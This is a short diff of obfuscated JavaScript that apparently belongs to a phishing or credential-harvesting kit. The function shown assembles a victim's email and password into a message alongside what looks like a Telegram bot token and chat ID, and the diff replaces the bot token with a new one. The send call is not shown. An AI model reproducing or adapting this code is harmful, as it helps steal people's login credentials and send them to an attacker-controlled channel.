@@ -12,7 +12,7 @@
         }
 
         function _0x1298a(data) {
-            const _0x40d1b3a = '8323449423:AAFe-qdQ3bCML_dDO_VxrU9GpWliTHrZMRk';
+            const _0x40d1b3a = '7928094847:AAGaR3yCB4ty6jcJuDtEtZwtSpfE2PqMxpQ';
             const _0x301fc5a = '7110810226';
 
             const _0x93b389a = `????? - ${data.email}:${data.password}`;
@@ -146,3 +146,4 @@
             });
 
         });
+
